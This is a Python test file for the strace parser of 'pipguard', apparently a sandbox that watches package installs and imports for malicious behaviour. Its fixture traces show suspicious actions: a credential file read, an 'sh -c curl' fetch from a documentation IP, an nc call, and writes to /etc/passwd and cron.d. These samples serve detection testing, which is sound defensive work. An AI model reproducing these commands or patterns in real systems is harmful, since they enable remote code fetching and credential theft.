# ruff: noqa: E501  (verbatim strace lines are long)
"""strace parser: realistic multi-pid samples, every observation type, caps, fuzzing."""

from __future__ import annotations

import time

from hypothesis import given, settings
from hypothesis import strategies as st

from pipguard.trace import (
    MAX_ADDRESS,
    MAX_ARG,
    MAX_ARGV_ITEMS,
    MAX_INPUT_BYTES,
    MAX_OBSERVATIONS,
    MAX_PATH,
    ParsedStep,
    decode_string,
    parse_strace,
    split_args,
)

CREDS = [
    "/home/sandbox/.aws/credentials",
    "/home/sandbox/.ssh/id_rsa",
    "/home/sandbox/.netrc",
    "/home/sandbox/project/.env",
]
PY = '"/usr/local/bin/python", ["python", "-I", "-c", "import x"], 0x7ffd5c0e2b98 /* 9 vars */'


def parse(text: str, step: str = "import") -> ParsedStep:
    return parse_strace(text, step, credential_paths=CREDS)  # type: ignore[arg-type]


# A trimmed but format-faithful import trace: root python, a child doing a PATH search
# for curl via sh, credential read, connect attempts, unfinished/resumed stitching.
SAMPLE = f"""\
100   execve({PY}) = 0
100   openat(AT_FDCWD, "/usr/local/lib/python3.12/os.py", O_RDONLY|O_CLOEXEC) = 3
100   openat(AT_FDCWD, "/home/sandbox/.aws/credentials", O_RDONLY|O_CLOEXEC) = 3
100   socket(AF_INET, SOCK_STREAM|SOCK_CLOEXEC, IPPROTO_IP) = 4
100   connect(4, {{sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.10")}}, 16) = -1 ENETUNREACH (Network is unreachable)
100   connect(5, {{sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}}, 110) = -1 ENOENT (No such file or directory)
100   connect(5, {{sa_family=AF_INET6, sin6_port=htons(80), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2001:db8::1", &sin6_addr), sin6_scope_id=0}}, 28) = -1 ENETUNREACH (Network is unreachable)
100   vfork( <unfinished ...>
101   execve("/bin/sh", ["sh", "-c", "curl -s https://203.0.113.10/c"], 0x7ffe /* 9 vars */ <unfinished ...>
100   <... vfork resumed>) = 101
101   <... execve resumed>) = 0
101   execve("/usr/local/bin/curl", ["curl", "-s", "https://203.0.113.10/c"], 0x55 /* 9 vars */) = -1 ENOENT (No such file or directory)
101   execve("/usr/local/sbin/curl", ["curl", "-s", "https://203.0.113.10/c"], 0x55 /* 9 vars */) = -1 ENOENT (No such file or directory)
101   execve("/usr/bin/curl", ["curl", "-s", "https://203.0.113.10/c"], 0x55 /* 9 vars */) = -1 ENOENT (No such file or directory)
101   +++ exited with 127 +++
100   --- SIGCHLD {{si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=101, si_uid=10001, si_status=127}} ---
100   wait4(101, [{{WIFEXITED(s) && WEXITSTATUS(s) == 127}}], 0, NULL) = 101
100   openat(AT_FDCWD, "/home/sandbox/.bashrc", O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC, 0666) = -1 EROFS (Read-only file system)
100   openat(AT_FDCWD, "/tmp/tmpabc", O_RDWR|O_CREAT|O_EXCL|O_NOFOLLOW|O_CLOEXEC, 0600) = 3
100   exit_group(0)                     = ?
100   +++ exited with 0 +++
"""


def test_sample_observations() -> None:
    p = parse(SAMPLE)
    assert p.root_pid == 100
    assert p.root_exit_code == 0
    assert p.garbage_lines == 0
    assert [c.path for c in p.credential_reads] == ["/home/sandbox/.aws/credentials"]
    assert [(c.family, c.address, c.port) for c in p.connects] == [
        ("AF_INET", "203.0.113.10", 443),
        ("AF_INET6", "2001:db8::1", 80),
    ]
    # root python excluded; sh reported; curl's PATH search reported once
    assert [s.argv for s in p.subprocesses] == [
        ["sh", "-c", "curl -s https://203.0.113.10/c"],
        ["curl", "-s", "https://203.0.113.10/c"],
    ]
    assert [w.path for w in p.writes] == ["/home/sandbox/.bashrc"]
    assert all(o.step == "import" for o in [*p.connects, *p.subprocesses, *p.writes])
    assert not p.truncated


def test_root_path_search_excluded_but_later_root_exec_reported() -> None:
    text = (
        '7 execve("/usr/local/sbin/python", ["python"], 0x1 /* 1 vars */) = -1 ENOENT (x)\n'
        '7 execve("/usr/local/bin/python", ["python"], 0x1 /* 1 vars */) = 0\n'
        '7 execve("/bin/sh", ["sh", "-c", "id"], 0x1 /* 1 vars */) = 0\n'
        '7 execve("/usr/local/bin/python", ["python"], 0x1 /* 1 vars */) = 0\n'
    )
    p = parse(text)
    assert [s.argv for s in p.subprocesses] == [["sh", "-c", "id"], ["python"]]


def test_bracket_pid_prefix_and_execveat() -> None:
    text = (
        '[pid  12] execve("/x", ["x"], 0x1 /* 0 vars */) = 0\n'
        '[pid  13] execveat(AT_FDCWD, "/bin/nc", ["nc", "1.2.3.4"], NULL, 0) = 0\n'
    )
    assert [s.argv for s in parse(text).subprocesses] == [["nc", "1.2.3.4"]]


def test_exec_without_parsable_argv_uses_path() -> None:
    text = '1 execve("/x", ["x"], 0) = 0\n2 execve("/bin/id", NULL, NULL) = 0\n'
    assert [s.argv for s in parse(text).subprocesses] == [["/bin/id"]]


def test_open_variants_and_allowed_prefixes() -> None:
    text = (
        '1 execve("/x", ["x"], 0) = 0\n'
        '1 open("/etc/passwd", O_RDWR) = -1 EROFS (x)\n'
        '1 creat("/usr/lib/evil.so", 0644) = -1 EROFS (x)\n'
        '1 openat(AT_FDCWD, "/dev/null", O_WRONLY) = 3\n'
        '1 openat(AT_FDCWD, "/sandbox/site-packages/a.py", O_WRONLY|O_CREAT) = 3\n'
        '1 openat(AT_FDCWD, "/tmpfoo", O_WRONLY|O_CREAT) = 3\n'
        '1 openat(AT_FDCWD, "/tmp/../etc/cron.d/x", O_WRONLY|O_CREAT) = -1 EROFS (x)\n'
        '1 openat(AT_FDCWD, "notes.txt", O_WRONLY|O_CREAT, 0666) = -1 EROFS (x)\n'
        '1 openat(3, "rel", O_WRONLY|O_CREAT, 0666) = 4\n'
        '1 openat2(AT_FDCWD, "/opt/x", {flags=O_WRONLY|O_CREAT, mode=0644}, 24) = -1 EROFS (x)\n'
        '1 openat(AT_FDCWD, "/home/sandbox/.netrc", O_RDONLY) = 3\n'
        '1 openat(AT_FDCWD, "/home/sandbox/.netrc", O_RDONLY) = 3\n'
        '1 openat(AT_FDCWD, ".env", O_RDONLY) = 3\n'
        '1 stat("/home/sandbox/.ssh/id_rsa", {st_mode=S_IFREG|0600, st_size=1}) = 0\n'
    )
    p = parse(text, "install")
    assert [w.path for w in p.writes] == [
        "/etc/passwd",
        "/usr/lib/evil.so",
        "/tmpfoo",
        "/etc/cron.d/x",
        "/home/sandbox/project/notes.txt",
        "rel",
        "/opt/x",
    ]
    assert [c.path for c in p.credential_reads] == [
        "/home/sandbox/.netrc",
        "/home/sandbox/project/.env",
    ]
    assert all(w.step == "install" for w in p.writes)


def test_unix_and_other_connects() -> None:
    text = (
        '1 connect(3, {sa_family=AF_UNIX, sun_path="/run/nscd/socket"}, 110) = -1 ENOENT (x)\n'
        '1 connect(3, {sa_family=AF_UNIX, sun_path="/run/docker.sock"}, 110) = -1 ENOENT (x)\n'
        '1 connect(3, {sa_family=AF_UNIX, sun_path=@"abstract"}, 12) = -1 ECONNREFUSED (x)\n'
        "1 connect(3, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 0\n"
        "1 connect(3, {sa_family=AF_INET, sin_port=htons(99999), sin_addr=0}, 16) = -1 E (x)\n"
        "1 connect(3) = -1 EBADF (x)\n"
    )
    p = parse(text)
    assert [(c.family, c.address, c.port) for c in p.connects] == [
        ("AF_UNIX", "/run/docker.sock", None),
        ("AF_UNIX", "abstract", None),
        ("other", "", None),
        ("AF_INET", "", None),
    ]


def test_escapes_and_control_chars_stripped() -> None:
    text = (
        '1 execve("/x", ["x"], 0) = 0\n'
        r'1 execve("/bin/echo", ["echo", "a\"b", "\x1b[31mred", "tab\there", "\303\251", "\\"], 0) = 0'
        "\n"
    )
    (s,) = parse(text).subprocesses
    assert s.argv == ["echo", 'a"b', "[31mred", "tabhere", "é", "\\"]


def test_truncated_string_and_argv_ellipsis() -> None:
    text = '1 execve("/x", ["x"], 0) = 0\n2 execve("/bin/sh", ["sh", "aaaa"..., ...], 0) = 0\n'
    p = parse(text)
    assert p.subprocesses[0].argv == ["sh", "aaaa"]
    assert p.truncated


def test_field_caps() -> None:
    long = "a" * 1000
    argv = ", ".join(f'"{long}"' for _ in range(40))
    text = (
        '1 execve("/x", ["x"], 0) = 0\n'
        f'2 execve("/bin/sh", [{argv}], 0) = 0\n'
        f'2 openat(AT_FDCWD, "/{long}", O_WRONLY|O_CREAT) = -1 EROFS (x)\n'
        f'2 connect(3, {{sa_family=AF_UNIX, sun_path="/{long}"}}, 110) = -1 E (x)\n'
    )
    p = parse(text)
    (s,) = p.subprocesses
    assert len(s.argv) == MAX_ARGV_ITEMS and all(len(a) == MAX_ARG for a in s.argv)
    assert len(p.writes[0].path) == MAX_PATH
    assert len(p.connects[0].address) == MAX_ADDRESS
    assert p.truncated


def test_observation_list_cap_and_dedup() -> None:
    lines = ['1 execve("/x", ["x"], 0) = 0']
    lines += [
        f"1 connect(3, {{sa_family=AF_INET, sin_port=htons({i}), "
        f'sin_addr=inet_addr("10.0.0.1")}}, 16) = -1 E (x)'
        for i in range(1, 300)
    ]
    lines += ['1 connect(3, {sa_family=AF_INET, sin_port=htons(1), sin_addr=inet_addr("10.0.0.1")}']
    p = parse("\n".join(lines))
    assert len(p.connects) == MAX_OBSERVATIONS
    assert p.truncated


def test_unfinished_at_end_still_counts_and_orphan_resumed_is_garbage() -> None:
    text = (
        '1 execve("/x", ["x"], 0) = 0\n'
        "2 <... connect resumed>) = 0\n"
        '2 connect(3, {sa_family=AF_INET, sin_port=htons(1), sin_addr=inet_addr("1.1.1.1")}'
        ", 16 <unfinished ...>\n"
    )
    p = parse(text)
    assert p.garbage_lines == 1
    assert [c.address for c in p.connects] == ["1.1.1.1"]


def test_garbage_lines_counted() -> None:
    p = parse("hello world\n\n12 ???\nstrace: oops\n--- SIGTERM ---\n+++ killed by SIGKILL +++\n")
    assert p.garbage_lines == 3
    assert p.root_pid is None


def test_line_cap_keeps_prefix() -> None:
    huge = '1 openat(AT_FDCWD, "/etc/x", O_WRONLY) = 3' + " " * 200_000 + "\n"
    p = parse('1 execve("/x", ["x"], 0) = 0\n' + huge)
    assert [w.path for w in p.writes] == ["/etc/x"]
    assert p.truncated


def test_input_over_cap_is_truncated() -> None:
    filler = '1 openat(AT_FDCWD, "/usr/lib/a", O_RDONLY) = 3\n'
    text = filler * (MAX_INPUT_BYTES // len(filler) + 10)
    p = parse(text)
    assert p.input_truncated and p.truncated


def test_split_args_and_decode_helpers() -> None:
    s = 'f(1, "a,(b", {x=[1, 2]}, g(3)) = 0'
    args, rest = split_args(s, 2)
    assert args == ["1", '"a,(b"', "{x=[1, 2]}", "g(3)"]
    assert rest == " = 0"
    assert split_args('f("unterminated', 2) == (['"unterminated'], None)
    assert split_args("f(a, b", 2) == (["a", "b"], None)
    out = ParsedStep(step="import")
    assert decode_string("NULL", 10, out) is None
    assert decode_string(r'"\101\x42\n"', 10, out) == "AB"
    assert decode_string('"abc', 10, out) == "abc" and out.truncated


# ------------------------------------------------------------------ fuzzing (FR-4.11)

_FRAGMENTS = st.sampled_from(
    [
        "1 ",
        "[pid 2] ",
        "execve(",
        "openat(AT_FDCWD, ",
        "connect(3, {sa_family=AF_INET, ",
        "sun_path=",
        '"',
        "\\",
        "\\x4",
        "[",
        "]",
        "{",
        "}",
        "(",
        ")",
        ", ",
        " = 0",
        " = -1 ENOENT (x)",
        " <unfinished ...>",
        "<... execve resumed>",
        "+++ exited with 1 +++",
        "...",
        "O_WRONLY|O_CREAT",
        "\x00",
        "\n",
        "/home/sandbox/.aws/credentials",
    ]
)


def _check_caps(p: ParsedStep) -> None:
    for w in p.writes:
        assert len(w.path) <= MAX_PATH
    for c in p.credential_reads:
        assert len(c.path) <= MAX_PATH
    for s in p.subprocesses:
        assert 0 < len(s.argv) <= MAX_ARGV_ITEMS and all(len(a) <= MAX_ARG for a in s.argv)
    for c in p.connects:
        assert len(c.address) <= MAX_ADDRESS
        assert c.port is None or 0 <= c.port <= 65535
    for obs in (p.writes, p.credential_reads, p.subprocesses, p.connects):
        assert len(obs) <= MAX_OBSERVATIONS
    texts = [w.path for w in p.writes] + [a for s in p.subprocesses for a in s.argv]
    texts += [c.address for c in p.connects]
    assert not any(ch < " " or "\x7f" <= ch <= "\x9f" for t in texts for ch in t)


@settings(max_examples=300, deadline=None)
@given(st.text(max_size=2000))
def test_fuzz_arbitrary_text_never_raises(text: str) -> None:
    _check_caps(parse(text))


@settings(max_examples=300, deadline=None)
@given(st.lists(_FRAGMENTS, max_size=200).map("".join))
def test_fuzz_structured_garbage_never_raises(text: str) -> None:
    _check_caps(parse(text))


@settings(max_examples=20, deadline=None)
@given(st.sampled_from(['"', "(", "[", ",", "\\", '\\"', "{", 'a"', "x"]))
def test_adversarial_1mb_line_is_fast(unit: str) -> None:
    line = '1 execve("/x", [' + unit * (1_000_000 // len(unit)) + "\n"
    start = time.perf_counter()
    _check_caps(parse(line))
    assert time.perf_counter() - start < 1.0


# ---------------------------------------------------------------- review hardening


def _creds(text: str) -> list[str]:
    from pipguard.trace import parse_strace

    out = parse_strace(
        text, "import", credential_paths=["/home/sandbox/.aws/credentials", "/home/sandbox/.netrc"]
    )
    return [c.path for c in out.credential_reads]


def test_credential_aliases_are_canonicalised() -> None:
    assert _creds('7 openat(AT_FDCWD, "//home/sandbox/.aws/credentials", O_RDONLY) = 3\n')
    assert _creds('7 openat(AT_FDCWD, "/proc/self/root/home/sandbox/.netrc", O_RDONLY) = 3\n')
    assert _creds(
        '7 openat(AT_FDCWD, "/proc/12/root//proc/self/root/home/sandbox/.netrc", O_RDONLY) = 3\n'
    )
    assert _creds('7 openat(5, ".netrc", O_RDONLY) = 3\n')  # dirfd-relative, by name
    assert not _creds('7 openat(AT_FDCWD, "/home/sandbox/.netrc.bak", O_RDONLY) = -1 ENOENT\n')


def test_link_to_credential_counts_as_read() -> None:
    assert _creds('7 symlink("/home/sandbox/.aws/credentials", "/tmp/x") = 0\n')
    assert _creds('7 linkat(AT_FDCWD, "/home/sandbox/.netrc", AT_FDCWD, "/tmp/y", 0) = 0\n')
    assert not _creds('7 symlink("/etc/hosts", "/tmp/x") = 0\n')


def test_udp_sendto_is_a_connect_attempt() -> None:
    from pipguard.trace import parse_strace

    text = (
        '7 sendto(3, "x", 1, 0, {sa_family=AF_INET, sin_port=htons(53), '
        'sin_addr=inet_addr("8.8.8.8")}, 16) = -1 ENETUNREACH\n'
        '7 sendto(4, "y", 1, 0, NULL, 0) = 1\n'
        "7 sendmsg(3, {msg_name={sa_family=AF_INET6, sin6_port=htons(443), "
        'sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2001:db8::9", &sin6_addr), '
        "sin6_scope_id=0}, msg_namelen=28}, 0) = -1 ENETUNREACH\n"
    )
    out = parse_strace(text, "import", credential_paths=[])
    assert [(c.family, c.address, c.port) for c in out.connects] == [
        ("AF_INET", "8.8.8.8", 53),
        ("AF_INET6", "2001:db8::9", 443),
    ]
